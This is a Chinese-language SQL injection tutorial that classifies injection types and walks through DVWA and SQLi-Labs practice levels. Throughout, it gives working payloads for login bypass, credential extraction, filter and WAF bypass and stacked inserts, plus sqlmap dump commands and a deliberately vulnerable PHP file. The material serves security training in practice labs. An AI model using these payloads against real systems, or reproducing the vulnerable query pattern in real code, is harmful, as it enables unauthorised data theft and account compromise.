# SQL注入类型与请求方式注入

## 一、SQL注入分类总览

SQL注入按不同维度有多种分类方式：

| 维度 | 分类 |
|------|------|
| 请求方法 | GET / POST / Cookie / HTTP头 / Request |
| 参数类型 | 数字型 / 字符型 / 搜索型 / JSON |
| 注入位置 | 请求行 / 请求头 / 请求体 |
| 攻击手法 | 联合查询 / 报错注入 / 布尔盲注 / 时间盲注 / 堆叠注入 / 宽字节 / 二次注入 |
| 数据库权限 | 普通注入 / 高权限注入（跨库、文件读写、命令执行） |

---

## 二、按请求方法分类

### 2.1 GET 注入

GET 注入是最常见的形式，注入点出现在 URL 的查询参数中。

**特征**：参数通过 URL 传递，在地址栏可见。

**示例场景**：
```
http://target.com/product.php?id=1
http://target.com/search.php?keyword=admin
http://target.com/user.php?uid=3&page=1
```

**测试方法**：
```sql
# 单引号测试
?id=1'

# 逻辑测试
?id=1 and 1=1    # 页面正常
?id=1 and 1=2    # 页面异常 → 存在注入

# 注释符测试
?id=1' --+
?id=1' #

# 联合查询
?id=1' order by 3 --+
?id=-1' union select 1,2,3 --+

# 盲注
?id=1' and length(database())>1 --+
?id=1' and ascii(substr(database(),1,1))>100 --+
```

**工具传参**：
```bash
# sqlmap GET注入
sqlmap -u "http://target.com/product.php?id=1" --dbs

# 带cookie
sqlmap -u "http://target.com/product.php?id=1" --cookie="PHPSESSID=xxx" --dbs
```

**注意**：
- URL 中特殊字符需 URL 编码（空格 → `%20`，`'` → `%27`）
- GET 参数会被记录在服务器访问日志中
- 浏览器插件、代理工具（Burp Suite）可直接拦截修改

---

### 2.2 POST 注入

POST 注入的注入点位于请求体中，参数不在 URL 上显示。

**特征**：参数在 HTTP Body 中，常用于登录框、搜索框、表单提交。

**请求示例**：
```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' or 1=1--+&password=123456
```

**测试方法**：

```sql
# BP抓包后，在Repeater中修改POST body测试

# 万能密码绕过登录
username=admin' or '1'='1'--+&password=xxx
username=admin' or 1=1#&password=xxx
username=admin'--+&password=xxx

# 联合查询测试
username=-1' union select 1,2,3--+&password=xxx

# 联合查询脱库
username=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+&password=xxx
```

**sqlmap 传参**：
```bash
# --data 指定POST数据
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --dbs

# 从文件读取POST请求
sqlmap -r post.txt --dbs

# 自动识别表单
sqlmap -u "http://target.com/login.php" --forms --dbs
```

**注意**：
- POST body 中的 `+` 会被解析为空格（URL 编码规则）
- 需要 `Content-Type: application/x-www-form-urlencoded` 头
- 用 Burp Suite 抓包后 "Copy to file" 保存请求，再用 `sqlmap -r` 加载，最稳

---

### 2.3 Cookie 注入

Cookie 注入是指注入点存在于 Cookie 参数中，后端使用 `$_COOKIE[]` 或 `$_REQUEST[]` 获取并直接拼接 SQL。

**特征**：注入点在 Cookie 字段中，通常需要登录后才有 Cookie。

**产生原因**：
```php
// 后端代码示例（漏洞点）
$uid = $_COOKIE['user_id'];
$sql = "SELECT * FROM users WHERE id = $uid";  // 直接拼接
```

**请求示例**：
```http
GET /user.php HTTP/1.1
Host: target.com
Cookie: user_id=1' and 1=1--+

# 或者
Cookie: user_id=1 union select 1,2,database()
```

**测试方法**：
```sql
# 原始Cookie可能是
Cookie: uid=1; PHPSESSID=xxx

# 修改为
Cookie: uid=1' and 1=1--+; PHPSESSID=xxx
Cookie: uid=1' and 1=2--+; PHPSESSID=xxx       # 页面不同 → 存在注入
Cookie: uid=-1' union select 1,2,3--+; PHPSESSID=xxx
```

**sqlmap 传参**：
```bash
# cookie注入——重点参数
sqlmap -u "http://target.com/user.php" --cookie="uid=1" --dbs

# 指定注入参数和等级
sqlmap -u "http://target.com/user.php" --cookie="uid=1" --level 2 --dbs

# 从文件加载cookie（推荐）
sqlmap -r request.txt --dbs

# 完整示例
sqlmap -u "http://target.com/index.php" --cookie="uid=1*" --dbs
```

**注意**：
- sqlmap 默认不检测 Cookie 注入，需要 **`--level 2`** 或更高
- 用 `*` 标记注入点：`--cookie="uid=1*"`
- Cookie 值中不能有 `;` 或 `,` 等特殊字符，需要 URL 编码
- Cookie 注入往往容易被忽略，实际渗透中很多
- `$_REQUEST[]` 会同时接收 GET、POST、Cookie 参数，增加注入面

---

### 2.4 Request 注入

Request 注入是 **PHP 特有**的概念，指后端使用 `$_REQUEST[]` 超全局数组接收参数，该数组**同时合并**了 `$_GET`、`$_POST`、`$_COOKIE` 数据。

**特征**：同一个变量名可以通过 GET、POST、Cookie 三种方式传递，后端不区分来源。

**产生原因**：
```php
// 后端代码
$id = $_REQUEST['id'];                          // 不区分来源
$sql = "SELECT * FROM news WHERE id = $id";
```

**攻击方式**：
```
GET 方式：http://target.com/news.php?id=1'
POST 方式：POST body 中 id=1'
Cookie 方式：Cookie: id=1'
```

**关键利用——WAF 绕过**：

很多 WAF 只检测 GET/POST 参数，忽略 Cookie。当 `$_REQUEST` 接收参数时：

1. 用 GET 方式正常访问 `?id=1`
2. 在 Cookie 中注入 `Cookie: id=1' union select 1,2,3--+`
3. PHP 的 `$_REQUEST['id']` 默认取 GET 的值……但如果 `request_order` 配置为 `CGP`，则 Cookie 优先级最高

**PHP 配置关键点** (`php.ini`)：
```
request_order = "GP"      # GET优先，然后是POST（默认）
request_order = "CGP"     # Cookie优先
variables_order = "EGPCS" # 决定哪些超全局变量被注册
```

**利用场景**：
```bash
# 场景：GET参数有WAF过滤，但Cookie没有
# 发送一个GET请求，URL上的id是正常的
# Cookie中带上注入payload
# 如果WAF只检测GET，可能绕过

GET /news.php?id=1 HTTP/1.1
Cookie: id=1' union select 1,2,3--+
```

**sqlmap 技巧**：
```bash
# 同时测试多种传参方式
sqlmap -u "http://target.com/news.php?id=1" --level 3 --dbs

# level 3 会同时检测 GET、POST、Cookie、UA、Referer 等
```

---

### 2.5 HTTP 头注入

HTTP 头注入指注入点在请求头字段中，后端将请求头信息存入数据库时未过滤导致。

**常见注入头**：

| HTTP头 | 后端记录目的 | 注入场景 |
|--------|-------------|---------|
| `User-Agent` | 记录浏览器类型、访问日志 | `INSERT INTO access_log (ua) VALUES ('$ua')` |
| `Referer` | 记录来源页面、流量分析 | `INSERT INTO stats (referer) VALUES ('$referer')` |
| `X-Forwarded-For` | 记录真实IP、CDN回源 | `INSERT INTO log (ip) VALUES ('$xff')` |
| `X-Real-IP` | 真实IP | 同上 |
| `Accept-Language` | 语言偏好 | 少数情况 |
| `Cookie` | 会话管理 | 见2.3 Cookie注入 |

**User-Agent 注入示例**：
```http
GET /index.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0' or updatexml(1,concat(0x7e,database()),1) or '1'='1
```

**Referer 注入示例**：
```http
GET /index.php HTTP/1.1
Host: target.com
Referer: http://target.com/index.php' and if(length(database())>1,sleep(5),0) and '1'='1
```

**X-Forwarded-For 注入示例**：
```http
GET /index.php HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1' or sleep(5) and '1'='1
```

**测试思路**：
```sql
# 1. UA头 - 报错注入（最常用）
User-Agent: Mozilla/5.0' and updatexml(1,concat(0x7e,database()),1) and '1'='1

# 2. UA头 - 时间盲注
User-Agent: Mozilla/5.0' and if(length(database())>1,sleep(5),1) and '1'='1

# 3. Referer - 联合查询（少用，因为insert场景多）
# HTTP头注入通常是INSERT/UPDATE，联合查询很难直接回显
# 优先用报错注入或时间盲注
```

**sqlmap 传参**：
```bash
# 检测HTTP头注入需要提高level
sqlmap -u "http://target.com/index.php" --level 3 --dbs

# --level 3 会检测 UA、Referer 头
# --level 5 会检测更多HTTP头

# 手动指定头进行测试
sqlmap -u "http://target.com/index.php" --headers="User-Agent: *" --dbs
sqlmap -u "http://target.com/index.php" --headers="X-Forwarded-For: *" --dbs

# 指定多个头
sqlmap -u "http://target.com/index.php" \
  --headers="User-Agent: *\nX-Forwarded-For: *" --dbs
```

**注意**：
- HTTP 头注入常见于**访问统计、日志记录**功能
- 通常是 **INSERT 注入**，无法使用联合查询回显
- **报错注入**和**时间盲注**是主要手法
- sqlmap 要 `--level 3` 以上才会检测 UA / Referer

---

## 三、按参数类型分类

### 3.1 数字型注入

数字型注入是指参数值**没有被引号包裹**，直接拼接到 SQL 中。

**SQL 原型**：
```sql
SELECT * FROM users WHERE id = 1           -- 参数直接是数字，无引号
SELECT * FROM products WHERE price > 100
```

**判断方法**：
```sql
# 不需要闭合引号
?id=1 and 1=1        # 正常
?id=1 and 1=2        # 异常 → 数字型

# 数学运算验证
?id=2-1              # 如果结果等同于 ?id=1 → 数字型
?id=3-2              # 同上逻辑
```

**注入语法**：
```sql
# 联合查询
?id=-1 union select 1,2,3
# 盲注
?id=1 and length(database())>1
# 时间盲注
?id=1 and if(length(database())>1,sleep(3),0)
```

**sqlmap 注意**：数字型注入 sqlmap 能自动识别，不需要手动指定。

---

### 3.2 字符型注入

字符型注入是指参数值**被单引号或双引号包裹**。

**SQL 原型**：
```sql
SELECT * FROM users WHERE name = 'admin'
SELECT * FROM news WHERE title = '$keyword'
SELECT * FROM products WHERE name = "product1"
```

**判断方法**：
```sql
# 闭合引号是关键
?id=1'               # 报错 → 字符型（单引号未闭合）
?id=1"               # 报错 → 可能是双引号

# 注释法闭合
?id=1' and 1=1 --+  # 正常
?id=1' and 1=2 --+  # 异常 → 确认字符型注入
?id=1" and 1=1 --+  # 测试双引号
```

**注入语法（单引号）**：
```sql
# 联合查询
?id=-1' union select 1,2,3 --+

# 报错注入
?id=1' and updatexml(1,concat(0x7e,database()),1) --+

# 盲注
?id=1' and length(database())>1 --+
?id=1' and if(length(database())>1,sleep(3),0) --+
```

**注入语法（双引号）**：
```sql
?id=-1" union select 1,2,3 --+
?id=1" and updatexml(1,concat(0x7e,database()),1) --+
```

**常见闭合场景**：
```sql
# 单引号闭合
$sql = "SELECT * FROM users WHERE name = '$name'";
# Payload: admin' or '1'='1

# 双引号闭合
$sql = 'SELECT * FROM users WHERE name = "$name"';
# Payload: admin" or "1"="1

# 括号闭合
$sql = "SELECT * FROM users WHERE id = ('$id')";
# Payload: 1') union select 1,2,3 --+

# 双括号
$sql = "SELECT * FROM users WHERE id = (('$id'))";
# Payload: 1')) union select 1,2,3 --+

# 单引号+括号
$sql = "SELECT * FROM users WHERE name = ('$name')";
# Payload: admin') or ('1')=('1
```

**闭合技巧总结**：
```
'       →  →  xxx' and 1=1 --+
"       →  →  xxx" and 1=1 --+
')      →  →  xxx') and 1=1 --+
")      →  →  xxx") and 1=1 --+
'))     →  →  xxx')) and 1=1 --+
"))     →  →  xxx")) and 1=1 --+
%'      →  →  xxx%' and 1=1 --+    (LIKE模糊查询)
```

---

### 3.3 搜索型注入

搜索型注入存在于**模糊搜索**功能中，SQL 使用 `LIKE` 语句。

**SQL 原型**：
```sql
SELECT * FROM products WHERE name LIKE '%$keyword%'
SELECT * FROM articles WHERE title LIKE '%$keyword%'
```

**特征**：
- 参数被 `%` 包裹
- 用 `LIKE` 进行模糊匹配
- 常见于搜索框、筛选功能

**判断方法**：
```sql
# 输入 admin%' and 1=1 and '%'=' 
# 拼接后: LIKE '%admin%' and 1=1 and '%'='%'
# 需要构造前后 % 闭合

# 具体判断
keyword=admin%' and 1=1 --+
keyword=admin%' and 1=2 --+   # 页面不同 → 存在注入
```

**注入语法**：
```sql
# 联合查询 —— 需要处理前后%
keyword=admin%' union select 1,2,3 and '%'='

# 报错注入
keyword=admin%' and updatexml(1,concat(0x7e,database()),1) and '%'='

# 盲注
keyword=admin%' and length(database())>1 and '%'='

# 时间盲注
keyword=admin%' and if(length(database())>1,sleep(3),0) and '%'='
```

---

### 3.4 JSON 注入

JSON 注入是当后端接收 JSON 格式数据并直接拼接 SQL 时产生的。

**特征**：请求的 `Content-Type: application/json`，请求体是 JSON 格式。

**请求示例**：
```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"123456"}
```

**SQL 原型**：
```php
// 后端代码示例
$data = json_decode(file_get_contents('php://input'), true);
$username = $data['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";
```

**判断方法**：
```json
{"username":"admin'","password":"123456"}        // 测试单引号
{"username":"admin\"","password":"123456"}       // 测试双引号
{"username":"admin' or 1=1--+"}                 // 测试注入
```

**注入语法**：
```json
// 万能密码
{"username":"admin' or '1'='1'--+","password":"xxx"}

// 联合查询
{"username":"-1' union select 1,2,3--+","password":"xxx"}

// 报错注入
{"username":"admin' and updatexml(1,concat(0x7e,database()),1)--+","password":"xxx"}

// 盲注
{"username":"admin' and if(length(database())>1,sleep(3),0)--+","password":"xxx"}
```

**sqlmap 传参**：
```bash
# JSON注入——直接传JSON字符串
sqlmap -u "http://target.com/api/login" \
  --data='{"username":"admin","password":"123"}' \
  --dbs

# 从文件加载请求（推荐）
# 先BP抓包，保存整个请求为 request.txt
sqlmap -r request.txt --dbs

# 指定注入参数
sqlmap -u "http://target.com/api/login" \
  --data='{"username":"admin*","password":"123"}' \
  --dbs
```

**注意**：
- JSON 注入前端通常用 AJAX/Fetch 发送，浏览器不易直接测试
- 用 Burp Suite 抓包 → Repeater 修改 → 测试
- Content-Type 必须是 `application/json`，否则后端可能不解析
- JSON 中的特殊字符注意转义

---

## 四、按攻击手法分类

| 手法 | 适用场景 | 关键特征 |
|------|---------|---------|
| 联合查询 (Union) | 有回显位 | 用 `union select` 直接获取数据 |
| 报错注入 (Error) | 有错误回显 | 用 `updatexml`/`extractvalue`/`floor` 让数据库报错并带出数据 |
| 布尔盲注 (Boolean) | 无回显无报错 | 通过页面是否正常判断 `true/false`，逐字符猜解 |
| 时间盲注 (Time) | 无任何回显差异 | 用 `sleep()` / `benchmark()` 制造延迟，逐字符猜解 |
| 堆叠注入 (Stacked) | 支持多语句执行 | 用 `;` 分隔多条 SQL |
| 宽字节注入 | GBK/GB2312 编码 | 用 `%df'` 吃掉转义符 `\` |
| 二次注入 | 数据先存后取 | 注册时写入 payload，登录后某处触发 |
| DNSlog 注入 | 无回显+不出网限制松 | 用 `load_file()` 发起DNS请求外带数据 |
| 布尔+时间联合 | 无回显有报错屏蔽 | `and if(条件,sleep(0),sleep(3))` |

---

## 五、实战——DVWA 练习全流程

DVWA (Damn Vulnerable Web Application) 是入门 SQL 注入最佳靶场，按难度递进。

### 5.1 环境准备

```
靶机: Windows/Linux + phpStudy / WAMP / Docker
DVWA: http://target.com/dvwa/
默认账号: admin / password
```

进入后先把难度设为 **Low**，逐步调到 **Medium**、**High**、**Impossible**。

### 5.2 DVWA SQL Injection 模块（GET注入）

#### Low 难度

**源码**：
```php
$id = $_GET['id'];
$sql = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

**分析**：单引号闭合的字符型注入，无任何过滤。

**练习步骤**：

```sql
# 步骤1: 判断注入类型
1'          → 报错，确认单引号闭合

# 步骤2: 确认注入
1' and 1=1 --+   → 正常
1' and 1=2 --+   → 无数据 → 注入存在

# 步骤3: 判断列数
1' order by 1 --+   → 正常
1' order by 2 --+   → 正常
1' order by 3 --+   → 报错 → 只有2列

# 步骤4: 查回显位
-1' union select 1,2 --+   → 看1和2哪个显示出来

# 步骤5: 查库名
-1' union select 1,database() --+

# 步骤6: 查表名
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+

# 步骤7: 查列名
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+

# 步骤8: 脱数据
-1' union select user,password from users --+
```

#### Medium 难度

**源码**：
```php
$id = $_POST['id'];     // 改用POST了
$sql = "SELECT first_name, last_name FROM users WHERE user_id = $id";  // 数字型
```

**变化**：POST方式 + 数字型 + 无引号。

**练习步骤**：
```sql
# Burp抓包，POST body中测试
id=1 and 1=1
id=1 and 1=2

# 联合查询
id=-1 union select 1,2

# 查库
id=-1 union select 1,database()
```

#### High 难度

**源码**：
```php
$id = $_SESSION['id'];  // 从session取
$sql = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1";
```

**变化**：从 Session 取参数，且附加 `LIMIT 1`，页面和输入框分离。

**绕过方法**：`LIMIT 1` 可以用注释绕过或用 `#` 注释掉。

```sql
# 在另一个页面的输入框中注入
1' union select 1,2#
1' union select user,password from users#
```

### 5.3 DVWA——测试 POST 注入

DVWA 的 **Brute Force** 和 **Login** 模块实际上也是 POST 注入的测试场景。

```sql
# 万能密码测试（在密码框）
username: admin
password: ' or '1'='1'-- 

# 或者用户名框
username: admin'-- 
password: xxx

# 在用户名中做注入
username: admin' union select 1,2#
password: xxx
```

### 5.4 DVWA——测试 Cookie 注入

DVWA 本身没有专门的 Cookie 注入模块，但可以在 **SQL Injection (Medium)** 中自行测试：

```
# 如果把 Medium 的 ?id=1 放在Cookie中
# 后端如果是 $_REQUEST['id']，则可以用Cookie传
Cookie: id=-1 union select 1,2; PHPSESSID=xxx
```

**更佳方式**：手动写一个简单的 PHP 文件测试 Cookie 注入逻辑：
```php
<?php
// cookie_test.php
$uid = $_COOKIE['uid'];
$conn = mysqli_connect('localhost','root','root','dvwa');
$sql = "SELECT * FROM users WHERE user_id = $uid";
$result = mysqli_query($conn, $sql);
while($row = mysqli_fetch_array($result)){
    echo $row['first_name'] . ' ' . $row['last_name'];
}
?>
```

---

## 六、实战——SQLi Labs 练习路线图

SQLi Labs 是专门练习 SQL 注入的靶场（基于 PHP + MySQL），共 65 关+。

### 6.1 环境搭建

```bash
# 推荐用 Docker
docker pull acgpiano/sqli-labs
docker run -d -p 80:80 acgpiano/sqli-labs

# 或手动搭建
# 1. 下载源码放到 WWW 目录
# 2. 导入 db 文件夹的 sql 文件
# 3. 修改 sql-connections/db-creds.inc 数据库密码
# 4. 访问 http://localhost/sqli-labs/
# 5. 点击 "Setup/reset Database" 初始化
```

### 6.2 分关练习对照表

#### 第一阶段：GET 注入基础（1-10关）

| 关卡 | 注入类型 | 练习要点 |
|------|---------|---------|
| Less-1 | GET + 单引号 + 字符型 + 联合查询 | 闭合 `'`，判断列数，联合查询回显 |
| Less-2 | GET + 数字型 + 联合查询 | 无闭合，直接注入 |
| Less-3 | GET + 单引号+括号 + 联合查询 | 闭合 `')` |
| Less-4 | GET + 双引号+括号 + 联合查询 | 闭合 `")` |
| Less-5 | GET + 单引号 + 报错注入 | 无回显位，用 updatexml |
| Less-6 | GET + 双引号 + 报错注入 | 双引号报错注入 |
| Less-7 | GET + 单引号+双括号 + 写文件 | 闭合 `'))` 用 into outfile |
| Less-8 | GET + 单引号 + 布尔盲注 | 页面无回显无报错，布尔盲注 |
| Less-9 | GET + 单引号 + 时间盲注 | 页面完全无差异，时间盲注 |
| Less-10 | GET + 双引号 + 时间盲注 | 双引号时间盲注 |

**Less-1 详解（必练）**：
```sql
# 1. 判断闭合
?id=1'
# 报错: '1'' LIMIT 0,1 → 单引号闭合

# 2. 判断列数
?id=1' order by 3 --+  → 正常
?id=1' order by 4 --+  → 报错 → 3列

# 3. 联合查询回显
?id=-1' union select 1,2,3 --+

# 4. 查库
?id=-1' union select 1,database(),3 --+

# 5. 查表
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

# 6. 查列
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

# 7. 脱数据
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

**Less-5 报错注入详解**：
```sql
# 无回显位，利用报错函数
# updatexml 方式
?id=1' and updatexml(1,concat(0x7e,database()),1) --+

# 查表
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+

# 查列
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')),1) --+

# 脱数据（报错输出有长度限制，分批查）
?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,30)),1) --+

# extractvalue 备用
?id=1' and extractvalue(1,concat(0x7e,database())) --+

# floor 报错
?id=1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

**Less-8 布尔盲注详解**：
```sql
# 页面完全无报错和数据差异，只能根据是否返回结果判断
# 猜数据库名长度
?id=1' and length(database())=8 --+  → 正常 → 库名长度为8

# 猜数据库名第一个字符
?id=1' and ascii(substr(database(),1,1))=115 --+  → 正常 → 's'

# 猜表名
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+

# 猜列名
?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105 --+

# 逐位猜解数据 → 建议用脚本/Burp Intruder
```

**Less-9 时间盲注详解**：
```sql
# 页面完全无变化，通过 sleep 延迟判断
# 判断注入
?id=1' and sleep(5) --+  → 延迟5秒 → 存在注入

# 判断当前库长度
?id=1' and if(length(database())=8,sleep(3),0) --+  → 延迟→长度8

# 猜库名首字符
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+

# 猜表名首字符
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0) --+

# 脱数据
?id=1' and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),1,1))=68,sleep(3),0) --+
```

#### 第二阶段：POST 注入（11-22关）

| 关卡 | 注入类型 | 练习要点 |
|------|---------|---------|
| Less-11 | POST + 单引号 + 联合查询 | Burp抓包，POST body注入 |
| Less-12 | POST + 双引号+括号 | 闭合 `")` |
| Less-13 | POST + 单引号+括号 + 报错注入 | 无回显的POST报错注入 |
| Less-14 | POST + 双引号 + 报错注入 | 双引号POST报错 |
| Less-15 | POST + 单引号 + 布尔盲注 | POST盲注 |
| Less-16 | POST + 双引号+括号 + 时间盲注 | POST时间盲注 |
| Less-17 | POST + UPDATE注入 | 修改密码处注入 |
| Less-18 | POST + UA头注入 | User-Agent注入 |
| Less-19 | POST + Referer头注入 | Referer注入 |
| Less-20 | POST + Cookie注入 | Cookie注入（重点） |
| Less-21 | POST + Cookie + 联合查询 | Cookie注入回显 |
| Less-22 | POST + Cookie + 报错注入 | Cookie注入报错 |

**Less-11 POST注入详解**：
```sql
# BP抓包，POST /Less-11/ HTTP/1.1
# 原始POST body: uname=admin&passwd=admin&submit=Submit

# 1. 测试注入
uname=admin'&passwd=admin&submit=Submit   → 报错

# 2. 万能密码
uname=admin' or 1=1--+&passwd=admin&submit=Submit

# 3. 判断列数
uname=admin' order by 3--+&passwd=admin&submit=Submit

# 4. 联合查询
uname=-1' union select 1,2--+&passwd=admin&submit=Submit

# 5. 查库
uname=-1' union select 1,database()--+&passwd=admin&submit=Submit

# 步骤同上，注意 --+ 中的 + 在POST body中是空格
# 推荐用 # 做注释符
uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&passwd=admin
```

**Less-18 UA头注入详解**：
```sql
# 需要先登录拿到session，然后修改User-Agent
# 原始请求：
GET /Less-18/index.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 ...

# 修改UA为：
User-Agent: Mozilla/5.0' and updatexml(1,concat(0x7e,database()),1) and '1'='1

# 这里是INSERT注入场景，推荐报错注入
User-Agent: Mozilla/5.0',1,updatexml(1,concat(0x7e,database()),1))--+
```

**Less-19 Referer头注入详解**：
```sql
# 同Less-18，注入点在Referer头
Referer: http://target.com' and updatexml(1,concat(0x7e,database()),1) and '1'='1
```

**Less-20 Cookie注入详解**：
```sql
# 注入点在Cookie中
# 修改Cookie: uname=admin' and 1=1--
Cookie: uname=admin' and updatexml(1,concat(0x7e,database()),1)--+ ; PHPSESSID=xxx
```

#### 第三阶段：进阶技巧（23-38关）

| 关卡 | 注入类型 | 练习要点 |
|------|---------|---------|
| Less-23 | GET + 过滤注释符 | 用 `or '1'='1` 闭合，不用 `--+` |
| Less-24 | 二次注入 | 注册恶意用户名 → 登录后改密码触发 |
| Less-25 | GET + 过滤 and/or | 双写绕过 `anandd`，或用 `&&` `||` |
| Less-26 | GET + 过滤空格和注释 | 用 `%a0` `/**/` `()` 替代空格 |
| Less-27 | GET + 过滤 union/select | 大小写双写绕过 |
| Less-28 | 更多过滤绕过 | 综合绕过练习 |
| Less-29-31 | WAF 绕过模拟 | 参数污染 (HPP) |
| Less-32 | 宽字节注入 | `%df'` 吃掉转义符 `\` |
| Less-33 | 宽字节 + POST | POST方式的宽字节注入 |
| Less-34 | 宽字节 + POST | POST宽字节 |
| Less-35 | 数字型绕过 | 数字型 addslashes 绕过 |
| Less-36-37 | 更多绕过 | 综合练习 |
| Less-38 | 堆叠注入 | 多语句执行 |

**Less-23 过滤注释符绕过**：
```sql
# 不能用 --+ 或 # 注释
# 手动闭合后面部分
?id=-1' union select 1,2,'3
?id=-1' union select 1,database(),'3
```

**Less-25 and/or 过滤绕过**：
```sql
# 双写绕过
?id=1' anandd 1=1 --+
?id=1' oorr 1=1 --+

# 符号绕过
?id=1' && 1=1 --+
?id=1' || 1=1 --+
```

**Less-32 宽字节注入**：
```sql
# 原理：addslashes() 在 ' 前加 \ (0x5c)
# GBK编码中 %df%5c 被解析为"運"字，吃掉转义符
# %df\' → %df%5c%27 → "運'"

# 闭合测试
?id=1%df' and 1=1 --+
?id=1%df' and 1=2 --+

# 联合查询
?id=-1%df' union select 1,2,3 --+
?id=-1%df' union select 1,database(),3 --+
```

**Less-38 堆叠注入**：
```sql
# 用分号执行多条SQL
?id=1'; insert into users(id,username,password) values(88,'hack','123') --+

# 验证
?id=1'; select * from users --+
```

#### 第四阶段：高级技巧（39-65关）

| 关卡范围 | 技巧 | 说明 |
|----------|------|------|
| Less-39-45 | 堆叠注入 | 各种堆叠场景 |
| Less-46-53 | ORDER BY 注入 | ORDER BY 后的注入 |
| Less-54-61 | 挑战关 | 限定次数，表名列名随机 |
| Less-62-65 | 布尔盲注挑战 | 限130次，需要脚本爆破 |

---

## 七、练习建议与路线

### 练习优先级
```
1. Less-1~4     → 掌握联合查询基本功（必须熟练）
2. Less-5~6     → 掌握报错注入
3. Less-8~10    → 掌握盲注（布尔+时间）
4. Less-11~17   → 掌握POST注入
5. Less-18~22   → 掌握HTTP头/Cookie注入
6. Less-23~38   → 掌握各种绕过技巧
7. Less-39~65   → 挑战提升
```

### 每关练习5步法
1. **判断闭合**：用 `'` `"` `')` 测试，看报错信息
2. **确认注入**：`and 1=1` / `and 1=2` 观察页面差异
3. **选择手法**：有回显 → union，有报错 → error，都没有 → 盲注
4. **获取数据**：库 → 表 → 列 → 数据
5. **记录总结**：每关做一个简短笔记（闭合方式、过滤了什么、用的什么手法）

### sqlmap 辅助验证
```
# 配合SQLi Labs使用sqlmap验证
sqlmap -u "http://target.com/sqli-labs/Less-1/?id=1" --dbs
sqlmap -u "http://target.com/sqli-labs/Less-1/?id=1" -D security -T users --dump

# POST
sqlmap -u "http://target.com/sqli-labs/Less-11/" --data="uname=admin&passwd=admin" --dbs

# Cookie
sqlmap -u "http://target.com/sqli-labs/Less-20/" --cookie="uname=admin" --level 2 --dbs
```

> **建议先手工打一遍，再用 sqlmap 验证。手工注入是理解原理的基础，工具是提效的手段。**

---

## 八、速查表

### 闭合方式速查
```
无闭合(数字)  → 直接注入
'闭合         → xxx' payload --+
"闭合         → xxx" payload --+
')闭合        → xxx') payload --+
")闭合        → xxx") payload --+
'))闭合       → xxx')) payload --+
%'闭合(搜索)  → xxx%' payload and '%'='
JSON闭合      → {"key":"xxx\" payload --+"}
```

### 注入手法选择速查
```
有回显位    → union select
有报错信息  → updatexml / extractvalue
无回显无报错(有差异) → 布尔盲注
无回显无报错(无差异) → 时间盲注
支持多语句  → 堆叠注入
GBK编码     → 宽字节注入
INSERT场景  → 报错注入 / 时间盲注
```

### 注释符速查
```
MySQL:   --+  /  --空格  /  /**/
MSSQL:   --
Oracle:  --
PostgreSQL: --
```
